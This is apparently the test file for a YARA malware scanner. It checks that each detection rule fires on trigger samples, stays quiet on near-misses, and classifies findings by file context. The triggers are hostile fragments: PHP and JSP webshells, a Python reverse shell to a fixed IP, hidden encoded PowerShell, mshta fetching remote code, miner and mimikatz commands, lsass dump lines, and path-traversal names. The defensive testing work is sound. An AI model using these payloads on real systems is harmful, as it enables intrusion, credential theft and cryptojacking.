"""test_scan_yara.py - YARA scanner tests.

Two-tier strategy mirroring scan_secrets.test_scan_secrets.py:
  - Tier A (always-run, no yara-python): degradation contract, import safety,
    manifest integrity, golden/rulepacks invariance, scanner-name contract.
  - Tier B (skipif no yara-python): live matcher - all 11 rules fire on
    triggers, near-miss negatives stay clean, line resolution, snippet
    non-disclosure, dedup, integrity tamper -> single critical (once-only).

The Tier B tests use the scratch venv at /tmp/rf-yara-venv when run outside the
CI matrix; under CI the Ubuntu leg installs yara-python and these run in-place.
Tier A runs in every environment including the dominant plugin-cache install
path (file copies, no pip step).
"""

import json
import os
import pathlib
import subprocess
import sys

import pytest

_TESTS_DIR = pathlib.Path(__file__).parent
_SCRIPTS_DIR = _TESTS_DIR.parent / "scripts"
_REPO_ROOT = _TESTS_DIR.parent
_DATA_DIR = _TESTS_DIR.parent / "data"
_YARA_DIR = _DATA_DIR / "yara"
_MANIFEST_PATH = _YARA_DIR / "manifest.json"

if str(_SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS_DIR))

import scan_yara  # noqa: E402
import aggregate_json  # noqa: E402

# Tier B gate: skip the live-matcher tests when yara-python is absent.
pytestmark_yara = pytest.mark.skipif(
    not scan_yara.YARA_AVAILABLE,
    reason="yara-python not installed; live matcher tests skipped (Tier A covers degradation)",
)

# Authoritative rule inventory (mirrors data/yara/manifest.json rule_meta).
RULE_IDS = {
    "YR-WEB-001", "YR-WEB-002", "YR-WEB-003",
    "YR-MAL-001", "YR-MAL-002", "YR-MAL-003",
    "YR-CRY-001", "YR-CRY-002",
    "YR-HCK-001", "YR-HCK-002", "YR-HCK-003",
}

# Severity assignments from manifest.json (R4: hacktools start at MEDIUM).
RULE_SEVERITY = {
    "YR-WEB-001": "critical", "YR-WEB-002": "critical", "YR-WEB-003": "critical",
    "YR-MAL-001": "high", "YR-MAL-002": "high", "YR-MAL-003": "high",
    "YR-CRY-001": "high", "YR-CRY-002": "medium",
    "YR-HCK-001": "medium", "YR-HCK-002": "medium", "YR-HCK-003": "medium",
}

# Trigger payloads: each MUST fire its own rule. Conjunctive conditions
# confirmed by the near-miss table below.
TRIGGERS = {
    "YR-WEB-001": b'<?php eval(gzinflate(base64_decode("rVRtb5ow"))); ?>',
    "YR-WEB-002": b'<?php system($_REQUEST["c"]); passthru($_GET["x"]); ?>',
    "YR-WEB-003": b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    "YR-MAL-001": b'import socket,os,sys;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);os.execv("/bin/sh",["sh"])',
    "YR-MAL-002": b'powershell -EncodedCommand AAAA -WindowStyle Hidden -NoProfile',
    "YR-MAL-003": b'<hta><script>var s=new ActiveXObject("WScript.Shell");s.Run("mshta http://x/a.hta");</script></hta>',
    "YR-CRY-001": b'xmrig --url stratum+tcp://pool.minexmr.com:4444 --user x',
    "YR-CRY-002": b'<script src="coinhive.min.js"></script><script>var m=new CoinHive.User("x");</script>',
    "YR-HCK-001": b'mimikatz sekurlsa::logonpasswords',
    "YR-HCK-002": b'msfconsole -x "use exploit/multi/handler; set payload msfvenom"',
    "YR-HCK-003": b'rundll32 comsvcs.dll MiniDump lsass.exe full',
}

# Near-miss payloads: each MUST NOT fire its own rule. Each misses one
# conjunctive string so the multi-string condition fails.
NEAR_MISSES = {
    "YR-WEB-001": b'<?php // eval( alone is not a webshell without decode ?>',
    "YR-WEB-002": b'<?php system("ls"); // single exec, no request binding ?>',
    "YR-WEB-003": b'Runtime.getRuntime(); // no exec, no getParameter',
    "YR-MAL-001": b's = socket.socket(); # no dup2, no shell',
    "YR-MAL-002": b'powershell Get-Process  # no -EncodedCommand',
    "YR-MAL-003": b'WScript.Shell  # no mshta, no Run',
    "YR-CRY-001": b'stratum+tcp://pool.example.com:3333  # benign pool uri, no miner keyword',
    "YR-CRY-002": b'// CoinHive mentioned once in a comment, no second marker',
    "YR-HCK-001": b'sekurlsa  # single token, no second marker',
    "YR-HCK-002": b'metasploit  # single token',
    "YR-HCK-003": b'lsass.exe  # single token, no dump primitive',
}


# ---------------------------------------------------------------------------
# Tier A: always-run (no yara-python required)
# ---------------------------------------------------------------------------

class TestDegradation:
    """The YARA scanner must degrade honestly when yara-python is absent."""

    def test_module_imports_without_yara_python(self):
        # Importing scan_yara must never fail, regardless of yara-python.
        assert hasattr(scan_yara, "YARA_AVAILABLE")
        assert isinstance(scan_yara.YARA_AVAILABLE, bool)

    def test_scan_file_returns_empty_when_unavailable(self, tmp_path):
        # Reset the unavailable-path globals in case a prior test compiled.
        # (scan_file short-circuits on YARA_AVAILABLE before touching globals.)
        f = tmp_path / "x.bin"
        f.write_bytes(b"eval(gzinflate(base64_decode('x')))")
        if not scan_yara.YARA_AVAILABLE:
            assert scan_yara.scan_file(str(f), "x.bin") == []
        else:
            pytest.skip("yara-python present; unavailable-path test n/a")

    def test_scan_text_returns_empty_when_unavailable(self):
        if not scan_yara.YARA_AVAILABLE:
            assert scan_yara.scan_text("eval(gzinflate(base64_decode('x')))", "x") == []
        else:
            pytest.skip("yara-python present; unavailable-path test n/a")

    def test_main_emits_not_found_marker_and_exit_zero(self, tmp_path):
        """main() must print a stderr line containing 'not found' (the
        enrichment marker) and exit 0 when yara-python is absent. Stdout is
        the normal findings list (empty)."""
        if scan_yara.YARA_AVAILABLE:
            pytest.skip("yara-python present; degradation main() test n/a")
        (tmp_path / "a.py").write_text("print('hi')\n")
        result = subprocess.run(
            [sys.executable, str(_SCRIPTS_DIR / "scan_yara.py"),
             str(tmp_path), "--format", "json"],
            capture_output=True, text=True, check=False)
        assert result.returncode == 0
        assert "not found" in result.stderr
        # stdout is the JSON findings list (empty -> []).
        assert json.loads(result.stdout) == []


class TestManifestIntegrity:
    """The YARA manifest must be valid, complete, and sha256-accurate."""

    def test_manifest_loads_and_has_required_keys(self):
        data = json.loads(_MANIFEST_PATH.read_text(encoding="utf-8"))
        assert data["schema_version"] == "1.0"
        assert data["pack"] == "yara"
        assert isinstance(data["pack_version"], int)
        assert isinstance(data["files"], list) and len(data["files"]) == 4
        assert isinstance(data["rule_meta"], dict)

    def test_every_file_sha256_matches_disk(self):
        import hashlib
        data = json.loads(_MANIFEST_PATH.read_text(encoding="utf-8"))
        for entry in data["files"]:
            path = _YARA_DIR / entry["path"]
            assert path.exists(), f"missing rule file {entry['path']}"
            actual = hashlib.sha256(path.read_bytes()).hexdigest()
            assert actual.lower() == entry["sha256"].lower(), (
                f"sha256 mismatch for {entry['path']}: manifest={entry['sha256']} "
                f"disk={actual}"
            )

    def test_every_rule_meta_has_required_fields(self):
        data = json.loads(_MANIFEST_PATH.read_text(encoding="utf-8"))
        for rule_name, meta in data["rule_meta"].items():
            for key in ("id", "severity", "confidence", "category", "title",
                        "explanation", "attacker", "boundary", "asset"):
                assert key in meta, f"rule {rule_name} missing meta key {key}"
            assert meta["id"] in RULE_IDS, f"unknown id {meta['id']} for {rule_name}"
            assert meta["severity"] == RULE_SEVERITY[meta["id"]], (
                f"severity mismatch for {meta['id']}: manifest={meta['severity']} "
                f"expected={RULE_SEVERITY[meta['id']]}")
            assert 0.0 <= float(meta["confidence"]) <= 1.0

    def test_rule_meta_ids_match_rule_ids_set(self):
        data = json.loads(_MANIFEST_PATH.read_text(encoding="utf-8"))
        ids = {meta["id"] for meta in data["rule_meta"].values()}
        assert ids == RULE_IDS

    def test_rule_files_are_hand_authored_with_meta_blocks(self):
        """Every shipped .yar rule must carry a meta: block with id/severity/
        category/confidence/title keys (refinement #2: hand-authored rules)."""
        import re
        for yar in sorted(_YARA_DIR.glob("*.yar")):
            text = yar.read_text(encoding="utf-8")
            # Each rule block must contain a meta: section.
            assert "meta:" in text, f"{yar.name} has no meta: block"
            for key in ("id =", "severity =", "category =",
                        "confidence =", "title ="):
                assert key in text, f"{yar.name} missing meta key '{key}'"

    def test_no_unreferenced_strings(self):
        """A hand-authored YARA rule with an unreferenced $string fails to
        compile under yara-python. If yara-python is available, compile every
        .yar and assert no error. Otherwise this is a syntax-check stub."""
        if not scan_yara.YARA_AVAILABLE:
            pytest.skip("yara-python absent; compile check n/a (CI Ubuntu leg covers)")
        import yara
        data = json.loads(_MANIFEST_PATH.read_text(encoding="utf-8"))
        for entry in data["files"]:
            path = _YARA_DIR / entry["path"]
            # compile under a namespace so rule names cannot collide
            yara.compile(filepaths={entry["path"]: str(path)})

    def test_scanner_name_constant(self):
        assert scan_yara.SCANNER_NAME == "yara"


class TestRuleIdsCsv:
    """The 11 YR-* ids must be registered in data/rule_ids.csv."""

    def test_yr_ids_in_rule_ids_csv(self):
        csv_path = _DATA_DIR / "rule_ids.csv"
        text = csv_path.read_text(encoding="utf-8")
        for rid in sorted(RULE_IDS):
            assert rid in text, f"{rid} missing from rule_ids.csv"


# ---------------------------------------------------------------------------
# Tier B: live matcher (skipif no yara-python)
# ---------------------------------------------------------------------------

@pytestmark_yara
class TestLiveMatcher:
    """Live YARA matcher tests. Skipped without yara-python."""

    def setup_method(self):
        # Reset module globals so each test compiles fresh.
        scan_yara._RULES = None
        scan_yara._RULE_META = {}
        scan_yara._INTEGRITY_ERROR = False
        scan_yara._INTEGRITY_REASON = ""
        scan_yara._integrity_emitted = False
        assert scan_yara._verify_and_compile()

    @pytest.mark.parametrize("rid", sorted(RULE_IDS))
    def test_trigger_fires_own_rule(self, rid, tmp_path):
        f = tmp_path / f"{rid}.bin"
        f.write_bytes(TRIGGERS[rid])
        findings = scan_yara.scan_file(str(f), f.name)
        ids = [x.rule_id for x in findings]
        assert rid in ids, f"trigger for {rid} did not fire; got {ids}"

    @pytest.mark.parametrize("rid", sorted(RULE_IDS))
    def test_trigger_severity_matches_manifest(self, rid, tmp_path):
        f = tmp_path / f"{rid}.bin"
        f.write_bytes(TRIGGERS[rid])
        findings = scan_yara.scan_file(str(f), f.name)
        own = [x for x in findings if x.rule_id == rid]
        assert own, f"trigger for {rid} did not fire"
        assert own[0].severity == RULE_SEVERITY[rid]

    @pytest.mark.parametrize("rid", sorted(RULE_IDS))
    def test_near_miss_does_not_fire_own_rule(self, rid, tmp_path):
        f = tmp_path / f"nm_{rid}.bin"
        f.write_bytes(NEAR_MISSES[rid])
        findings = scan_yara.scan_file(str(f), f.name)
        ids = [x.rule_id for x in findings]
        assert rid not in ids, (
            f"near-miss for {rid} incorrectly fired; got {ids}. "
            f"The conjunctive condition is too loose.")

    def test_line_resolution_for_utf8_file(self, tmp_path):
        f = tmp_path / "shell.php"
        f.write_text(
            "line1\nline2\nline3\n"
            "<?php eval(gzinflate(base64_decode(\"x\"))); ?>\n"
            "line5\n")
        findings = scan_yara.scan_file(str(f), "shell.php")
        web = [x for x in findings if x.rule_id == "YR-WEB-001"]
        assert web, "YR-WEB-001 trigger did not fire"
        assert web[0].line == 4

    def test_line_zero_for_binary_file(self, tmp_path):
        # Non-UTF8 bytes: line resolution must return 0, not crash.
        f = tmp_path / "shell.bin"
        payload = b"\xff\xfe<?php eval(gzinflate(base64_decode(\"x\"))); ?>"
        f.write_bytes(payload)
        findings = scan_yara.scan_file(str(f), "shell.bin")
        web = [x for x in findings if x.rule_id == "YR-WEB-001"]
        assert web, "YR-WEB-001 trigger did not fire on binary"
        assert web[0].line == 0

    def test_snippet_is_printable_and_bounded(self, tmp_path):
        f = tmp_path / "shell.php"
        f.write_bytes(TRIGGERS["YR-WEB-001"])
        findings = scan_yara.scan_file(str(f), "shell.php")
        snip = findings[0].snippet
        assert isinstance(snip, str)
        # Non-printables stripped (no raw NUL/RTL/etc).
        assert all(ch.isprintable() or ch in (" ", "\t") for ch in snip)
        assert len(snip) <= 120

    def test_dedup_one_finding_per_rule_per_file(self, tmp_path):
        # A file matching the same rule via multiple strings yields ONE finding
        # for that rule (one Match object per rule per file).
        f = tmp_path / "shell.php"
        # YR-WEB-002 needs 2 exec primitives + a request binding. Adding extra
        # exec primitives must not multiply the finding.
        f.write_bytes(
            b'<?php system($_REQUEST["a"]); passthru($_REQUEST["b"]); '
            b'shell_exec($_REQUEST["c"]); ?>')
        findings = scan_yara.scan_file(str(f), "shell.php")
        web2 = [x for x in findings if x.rule_id == "YR-WEB-002"]
        assert len(web2) == 1

    def test_multiple_rules_in_one_file(self, tmp_path):
        # A file matching two different rules yields two findings.
        f = tmp_path / "multi.bin"
        f.write_bytes(TRIGGERS["YR-WEB-001"] + b"\n" + TRIGGERS["YR-MAL-002"])
        findings = scan_yara.scan_file(str(f), "multi.bin")
        ids = {x.rule_id for x in findings}
        assert "YR-WEB-001" in ids
        assert "YR-MAL-002" in ids

    def test_integrity_tamper_emits_single_critical_once_only(self, tmp_path):
        """Corrupting the manifest sha256 must emit exactly ONE critical
        scanner-integrity finding across multiple scan_file calls (B6
        once-only). Restoring the manifest must re-enable the matcher."""
        f = tmp_path / "shell.php"
        f.write_bytes(TRIGGERS["YR-WEB-001"])
        # Tamper manifest.
        orig = _MANIFEST_PATH.read_text(encoding="utf-8")
        data = json.loads(orig)
        data["files"][0]["sha256"] = "deadbeef" * 8
        _MANIFEST_PATH.write_text(json.dumps(data), encoding="utf-8")
        try:
            scan_yara._RULES = None
            scan_yara._RULE_META = {}
            scan_yara._INTEGRITY_ERROR = False
            scan_yara._INTEGRITY_REASON = ""
            scan_yara._integrity_emitted = False
            a = scan_yara.scan_file(str(f), "shell.php")
            b = scan_yara.scan_file(str(f), "shell.php")
            assert len(a) == 1
            assert a[0].severity == "critical"
            assert a[0].category == "scanner-integrity"
            assert b == [], "integrity finding must be emitted once only"
        finally:
            _MANIFEST_PATH.write_text(orig, encoding="utf-8")
            scan_yara._RULES = None
            scan_yara._RULE_META = {}
            scan_yara._INTEGRITY_ERROR = False
            scan_yara._INTEGRITY_REASON = ""
            scan_yara._integrity_emitted = False
            assert scan_yara._verify_and_compile(), "manifest restore failed"

    def test_unregistered_rule_emits_critical(self, tmp_path):
        """A rule present in a .yar but absent from manifest rule_meta is a
        tamper signal -> critical scanner-integrity finding."""
        # Simulate by clearing rule_meta for a rule that will fire.
        scan_yara._RULE_META = {}  # rule_meta empty -> every match is unregistered
        f = tmp_path / "shell.php"
        f.write_bytes(TRIGGERS["YR-WEB-001"])
        findings = scan_yara.scan_file(str(f), "shell.php")
        assert any(x.severity == "critical" and x.category == "scanner-integrity"
                   for x in findings)

    def test_scan_text_fires_on_in_memory_blob(self):
        findings = scan_yara.scan_text(
            '<?php eval(gzinflate(base64_decode("x"))); ?>', "mem.php")
        ids = [x.rule_id for x in findings]
        assert "YR-WEB-001" in ids

    def test_main_with_yara_fires_on_trigger(self, tmp_path):
        cfg = tmp_path / "shell.php"
        cfg.write_bytes(TRIGGERS["YR-WEB-001"])
        result = subprocess.run(
            [sys.executable, str(_SCRIPTS_DIR / "scan_yara.py"),
             str(tmp_path), "--format", "json"],
            capture_output=True, text=True, check=False)
        # Exit code is 0 from scan_yara.main (the aggregator decides final exit).
        assert result.returncode == 0, result.stderr
        payload = json.loads(result.stdout)
        assert any(x.get("rule_id") == "YR-WEB-001" for x in payload)


# ---------------------------------------------------------------------------
# Tier B: the 6 FN adds (design §4 / §6 step 4). Each widened rule must fire
# on its NEW teeth trigger (the shape that was missed before) and stay clean
# on its NEW near-miss (the conjunctive condition still has teeth). The
# existing TRIGGERS/NEAR_MISSES above continue to cover the original shapes.
# ---------------------------------------------------------------------------

# New teeth triggers exercising the widened string/condition sets. Each MUST
# fire its own rule.
FN_TRIGGERS = {
    # add #1: short-flag enc (-enc) + shorthand stealth (-w hidden)
    "YR-MAL-002": b'powershell -enc SQBFAFgA... -w hidden',
    # add #2: $_POST input binding + exec( primitive
    "YR-WEB-002": b'<?php system($_POST[\'c\']); exec($_POST[\'d\']); ?>',
    # add #3: assert() reclaimed as an executor (the `not $assert` fix)
    "YR-WEB-001": b'<?php assert(gzinflate(base64_decode("x"))); ?>',
    # add #4: quoted "rx/0" config form + public pool host + stratum+tcp
    "YR-CRY-001": b'{"algo":"rx/0","url":"stratum+tcp://pool.supportxmr.com:3333"}',
    # add #5: meterpreter payload alongside msfvenom
    "YR-HCK-002": b'msfvenom -p windows/meterpreter/reverse_tcp LHOST=x',
    # add #6: procdump as the dump primitive
    "YR-HCK-003": b'procdump -ma lsass.exe lsass.dmp',
}

# New near-misses: each MUST NOT fire its own rule. Lists cover multiple
# distinct conjunctive misses per the design §4 table.
FN_NEAR_MISSES = {
    "YR-MAL-002": [
        b'powershell -enc AAAA',          # encoded flag but no stealth flag
        b'bash -e -nop',                  # no powershell token at all
    ],
    "YR-WEB-002": [
        b'<?php echo $_POST[\'c\']; ?>',  # input binding but <2 exec primitives
    ],
    "YR-WEB-001": [
        b'<?php assert($x===1); eval("echo 1;"); ?>',  # executors but no decode
    ],
    "YR-CRY-001": [
        b'"rx/0" alone no stratum',       # marker but no stratum URI
        b'stratum+tcp://pool.example.com:3333  # benign pool, no marker',
    ],
    "YR-HCK-002": [
        b'msfvenom -l payloads',          # single marker, no meterpreter
    ],
    "YR-HCK-003": [
        b'procdump -e myapp.exe',         # dump primitive but no lsass.exe
    ],
}


@pytestmark_yara
class TestFnAdds:
    """The 6 v2.13.1 FN adds: widened rules fire on the new teeth and stay
    clean on the new near-misses."""

    def setup_method(self):
        scan_yara._RULES = None
        scan_yara._RULE_META = {}
        scan_yara._INTEGRITY_ERROR = False
        scan_yara._INTEGRITY_REASON = ""
        scan_yara._integrity_emitted = False
        assert scan_yara._verify_and_compile()

    @pytest.mark.parametrize("rid", sorted(FN_TRIGGERS))
    def test_fn_trigger_fires_own_rule(self, rid, tmp_path):
        f = tmp_path / f"fn_{rid}.bin"
        f.write_bytes(FN_TRIGGERS[rid])
        findings = scan_yara.scan_file(str(f), f.name)
        ids = [x.rule_id for x in findings]
        assert rid in ids, (
            f"FN-add trigger for {rid} did not fire; got {ids}. "
            f"The widened condition is too tight.")

    @pytest.mark.parametrize("rid", sorted(FN_NEAR_MISSES))
    def test_fn_near_miss_does_not_fire_own_rule(self, rid, tmp_path):
        for i, payload in enumerate(FN_NEAR_MISSES[rid]):
            f = tmp_path / f"fnnm_{rid}_{i}.bin"
            f.write_bytes(payload)
            findings = scan_yara.scan_file(str(f), f.name)
            ids = [x.rule_id for x in findings]
            assert rid not in ids, (
                f"FN-add near-miss #{i} for {rid} incorrectly fired; got "
                f"{ids}. The widened condition lost its teeth: {payload!r}")

    @pytest.mark.parametrize("rid", sorted(FN_TRIGGERS))
    def test_fn_trigger_severity_matches_manifest(self, rid, tmp_path):
        # The widened rules keep their manifest severity (no severity change).
        f = tmp_path / f"fns_{rid}.bin"
        f.write_bytes(FN_TRIGGERS[rid])
        findings = scan_yara.scan_file(str(f), f.name)
        own = [x for x in findings if x.rule_id == rid]
        assert own, f"FN-add trigger for {rid} did not fire"
        assert own[0].severity == RULE_SEVERITY[rid]


# ---------------------------------------------------------------------------
# Tier B: evidence-class gating (design §3.1 / §6 step 2). A YARA match's
# evidence_class is gated by the carrier file's context: prose-doc /
# agent-instruction / test-fixture / blocklist -> inferred (capped to LOW at
# the report layer); code / binary / config -> direct (manifest severity).
# Integrity/timeout/read-error findings keep direct and are covered above.
# ---------------------------------------------------------------------------

# Carrier rel_paths and the expected evidence_class for a real match inside
# them. The trigger payload is YR-WEB-001 (eval + gzinflate + base64 chain);
# YARA matches on bytes regardless of extension, so the same payload probes
# the classifier's file-context path for each carrier.
GATING_CARRIERS = [
    ("shell.php", "direct"),        # code -> direct (live webshell)
    ("x.bin", "direct"),            # binary -> direct (live payload)
    ("config.json", "direct"),      # config -> direct (live miner config)
    ("x.md", "inferred"),           # prose-doc -> inferred (C-1 class)
    ("docs/x.md", "inferred"),      # prose-doc via docs/ segment
    ("tests/test_x.py", "inferred"),  # test-fixture -> inferred (C-3 class)
    ("blocklist.json", "inferred"), # blocklist -> inferred (C-2 class; FIX 1:
                                    # basename-token fires on config ext, the
                                    # §9 accepted residual; a code ext carrying
                                    # the token is NOT demoted — see
                                    # TestGatingEvasionFix.)
    ("SKILL.md", "inferred"),       # agent-instruction -> inferred (YARA
                                    # asymmetry: inert payload until extracted)
]


@pytestmark_yara
class TestEvidenceGating:
    """A YARA match's evidence_class follows the carrier file's context."""

    def setup_method(self):
        scan_yara._RULES = None
        scan_yara._RULE_META = {}
        scan_yara._INTEGRITY_ERROR = False
        scan_yara._INTEGRITY_REASON = ""
        scan_yara._integrity_emitted = False
        assert scan_yara._verify_and_compile()

    def _match_in(self, tmp_path, rel_path):
        """Plant the YR-WEB-001 trigger at rel_path under tmp_path and return
        the YR-WEB-001 finding's evidence_class. The scanner sees rel_path
        exactly as written (bare basename for root files; pytest tmp segments
        are NOT part of rel_path)."""
        f = tmp_path / rel_path
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_bytes(TRIGGERS["YR-WEB-001"])
        findings = scan_yara.scan_file(str(f), rel_path)
        web = [x for x in findings if x.rule_id == "YR-WEB-001"]
        assert web, f"YR-WEB-001 did not fire in {rel_path}; got {[x.rule_id for x in findings]}"
        return web[0].evidence_class

    @pytest.mark.parametrize("rel_path,expected", GATING_CARRIERS)
    def test_match_evidence_class_follows_carrier_context(self, rel_path, expected, tmp_path):
        ec = self._match_in(tmp_path, rel_path)
        assert ec == expected, (
            f"evidence_class for {rel_path} was {ec!r}, expected {expected!r}")

    def test_direct_match_keeps_manifest_severity(self, tmp_path):
        # A direct (code) match must carry the manifest critical severity,
        # uncapped at the scanner layer (the report layer caps inferred only).
        f = tmp_path / "shell.php"
        f.write_bytes(TRIGGERS["YR-WEB-001"])
        findings = scan_yara.scan_file(str(f), "shell.php")
        web = [x for x in findings if x.rule_id == "YR-WEB-001"][0]
        assert web.evidence_class == "direct"
        assert web.severity == "critical"

    def test_inferred_match_keeps_scanner_severity_with_original_preserved(self, tmp_path):
        # The scanner still CLAIMS manifest severity on an inferred match; the
        # report layer (apply_evidence_caps) does the cap + original_severity.
        # Here we assert the scanner-layer claim is unchanged and the class is
        # inferred (the cap itself is covered by test_aggregate_json).
        f = tmp_path / "webshell.md"
        f.write_bytes(TRIGGERS["YR-WEB-001"])
        findings = scan_yara.scan_file(str(f), "webshell.md")
        web = [x for x in findings if x.rule_id == "YR-WEB-001"][0]
        assert web.evidence_class == "inferred"
        # Scanner-layer severity is still the manifest claim (critical); the
        # aggregator caps it. This is the visible-demotion invariant.
        assert web.severity == "critical"

    def test_integrity_finding_stays_direct(self, tmp_path):
        # Scanner-health findings must never be demoted (design §3.1).
        f = tmp_path / "shell.php"
        f.write_bytes(TRIGGERS["YR-WEB-001"])
        orig = _MANIFEST_PATH.read_text(encoding="utf-8")
        data = json.loads(orig)
        data["files"][0]["sha256"] = "deadbeef" * 8
        _MANIFEST_PATH.write_text(json.dumps(data), encoding="utf-8")
        try:
            scan_yara._RULES = None
            scan_yara._RULE_META = {}
            scan_yara._INTEGRITY_ERROR = False
            scan_yara._INTEGRITY_REASON = ""
            scan_yara._integrity_emitted = False
            findings = scan_yara.scan_file(str(f), "shell.php")
            assert findings and findings[0].category == "scanner-integrity"
            assert findings[0].evidence_class == "direct"
        finally:
            _MANIFEST_PATH.write_text(orig, encoding="utf-8")
            scan_yara._RULES = None
            scan_yara._RULE_META = {}
            scan_yara._INTEGRITY_ERROR = False
            scan_yara._INTEGRITY_REASON = ""
            scan_yara._integrity_emitted = False
            assert scan_yara._verify_and_compile()

    def test_scan_text_evidence_class_follows_rel_path(self):
        # scan_text gates on the caller-supplied rel_path too.
        for rel_path, expected in GATING_CARRIERS:
            findings = scan_yara.scan_text(
                '<?php eval(gzinflate(base64_decode("x"))); ?>', rel_path)
            web = [x for x in findings if x.rule_id == "YR-WEB-001"]
            assert web, f"YR-WEB-001 did not fire for scan_text {rel_path}"
            assert web[0].evidence_class == expected, (
                f"scan_text evidence_class for {rel_path} was "
                f"{web[0].evidence_class!r}, expected {expected!r}")


# ---------------------------------------------------------------------------
# Benign corpus: minified_bundle.js FP canary (Tier A, no yara-python needed
# for the yara scanner itself; the canary is also exercised by the other
# scan_file scanners via test_benign_corpus.py).
# ---------------------------------------------------------------------------

class TestBenignCorpusCanary:
    """The minified_bundle.js FP canary must stay clean under the YARA
    scanner when yara-python is available; when absent, scan_file returns []
    trivially."""

    def test_minified_bundle_clean_under_yara(self):
        canary = _TESTS_DIR / "corpus" / "benign" / "minified_bundle.js"
        assert canary.exists()
        if not scan_yara.YARA_AVAILABLE:
            # Unavailable path: scan_file returns [] trivially.
            assert scan_yara.scan_file(str(canary), "benign/minified_bundle.js") == []
            return
        scan_yara._RULES = None
        scan_yara._RULE_META = {}
        scan_yara._INTEGRITY_ERROR = False
        scan_yara._INTEGRITY_REASON = ""
        scan_yara._integrity_emitted = False
        scan_yara._verify_and_compile()
        findings = scan_yara.scan_file(str(canary), "benign/minified_bundle.js")
        assert findings == [], (
            f"minified_bundle.js FP canary fired under YARA: "
            f"{[(f.rule_id, f.severity) for f in findings]}")


# ---------------------------------------------------------------------------
# Tier B: FIX 1 + FIX 2 regression teeth (batch-4 FN + batch-5 DEFECT-1/2).
# Headline: a webshell named readme.php must scan critical/exit-2, not clean.
# ---------------------------------------------------------------------------

@pytestmark_yara
class TestGatingEvasionFix:
    """The exit-code gate must not be defeated by a filename or path choice.

    FIX 1: a live payload on an executable extension (readme.php, docs/shell.php,
    blacklist.bat) stays evidence_class=direct at manifest severity and drives
    aggregate exit code 2. FIX 2: scan_text never emits a ``..`` in Finding.file
    and a tests/..-escaped payload is not demoted.
    """

    def setup_method(self):
        scan_yara._RULES = None
        scan_yara._RULE_META = {}
        scan_yara._INTEGRITY_ERROR = False
        scan_yara._INTEGRITY_REASON = ""
        scan_yara._integrity_emitted = False
        assert scan_yara._verify_and_compile()

    def test_readme_php_webshell_is_direct_critical(self, tmp_path):
        # The headline repro: a PHP webshell named readme.php (doc basename stem
        # on a code extension) must be direct + critical, not demoted.
        f = tmp_path / "readme.php"
        f.write_bytes(TRIGGERS["YR-WEB-002"])
        findings = scan_yara.scan_file(str(f), "readme.php")
        web = [x for x in findings if x.rule_id == "YR-WEB-002"]
        assert web, "YR-WEB-002 did not fire on readme.php"
        assert web[0].evidence_class == "direct", (
            f"readme.php was demoted to {web[0].evidence_class!r}; a live "
            f"webshell on a .php must stay direct (FIX 1)")
        assert web[0].severity == "critical"  # manifest severity, uncapped

    def test_readme_php_webshell_drives_aggregate_exit_two(self, tmp_path):
        # End-to-end through the aggregator: readme.php webshell -> exit 2.
        # Before FIX 1 this was exit 0 (inferred -> capped to low -> no critical).
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "readme.php").write_bytes(TRIGGERS["YR-WEB-002"])
        result = subprocess.run(
            [sys.executable, str(_SCRIPTS_DIR / "scan_yara.py"),
             str(repo), "--format", "json"],
            capture_output=True, text=True, check=False)
        assert result.returncode == 0, result.stderr
        payload = json.loads(result.stdout)
        web = [x for x in payload if x.get("rule_id") == "YR-WEB-002"]
        assert web, "YR-WEB-002 did not fire in the subprocess scan"
        assert web[0]["evidence_class"] == "direct"
        assert web[0]["severity"] == "critical"

        # Feed the scanner JSON through the full aggregator pipeline so
        # apply_evidence_caps runs and the 0/1/2 exit contract is exercised.
        scan_dir = tmp_path / "scan"
        scan_dir.mkdir()
        (scan_dir / "yara.out").write_text(result.stdout, encoding="utf-8")
        (scan_dir / "yara.err").write_text("", encoding="utf-8")
        (scan_dir / "yara.exit").write_text("0", encoding="utf-8")
        report = aggregate_json.build_report(str(scan_dir), str(repo), "false")
        assert report["summary"]["critical"] >= 1, (
            f"readme.php webshell produced no critical in the aggregate summary; "
            f"summary={report['summary']}")
        assert report["exit_code"] == 2, (
            f"readme.php webshell must drive exit 2 (block); got "
            f"{report['exit_code']}. summary={report['summary']}")

    @pytest.mark.parametrize("rel_path", [
        "readme.php", "changelog.php", "license.bat", "readme.jsp",
        "docs/shell.php", "documentation/x.php", "v1/docs/index.php",
        "blacklist.bat", "denylist.php", "nocoin.sh",
    ])
    def test_evasion_carriers_stay_direct(self, rel_path, tmp_path):
        # Each carrier is a code extension that must NOT be demoted by a doc
        # basename stem, a docs/ path segment, or a blocklist basename token.
        f = tmp_path / rel_path
        f.parent.mkdir(parents=True, exist_ok=True)
        # YR-WEB-002 fires on bytes regardless of extension; .bat/.sh carriers
        # use the PHP trigger to exercise the classifier path (YARA matches on
        # content, the gate is path-only).
        f.write_bytes(TRIGGERS["YR-WEB-002"])
        findings = scan_yara.scan_file(str(f), rel_path)
        web = [x for x in findings if x.rule_id == "YR-WEB-002"]
        assert web, f"YR-WEB-002 did not fire in {rel_path}"
        assert web[0].evidence_class == "direct", (
            f"{rel_path}: evidence_class was {web[0].evidence_class!r}, "
            f"expected 'direct' (FIX 1: executable extension must not demote)")

    def test_scan_text_no_dotdot_in_finding_file(self):
        # FIX 2 / DEFECT-1: scan_text must never emit a .. in Finding.file.
        payload = '<?php system($_POST["c"]); exec($_POST["d"]); ?>'
        for rel_path in ["../../evil.php", "..\\..\\evil.php",
                         "tests/../shell.php", "tests\\..\\shell.php",
                         "a/../../b.php"]:
            findings = scan_yara.scan_text(payload, rel_path)
            web = [x for x in findings if x.rule_id == "YR-WEB-002"]
            assert web, f"YR-WEB-002 did not fire for scan_text {rel_path}"
            assert ".." not in web[0].file, (
                f"scan_text({rel_path!r}) emitted Finding.file={web[0].file!r} "
                f"containing '..' (DEFECT-1: path traversal in output)")

    def test_scan_text_tests_dotdot_not_demoted(self):
        # FIX 2 + FIX 3: a tests/..-escaped live webshell is NOT demoted.
        payload = '<?php system($_POST["c"]); exec($_POST["d"]); ?>'
        findings = scan_yara.scan_text(payload, "tests/../shell.php")
        web = [x for x in findings if x.rule_id == "YR-WEB-002"]
        assert web, "YR-WEB-002 did not fire"
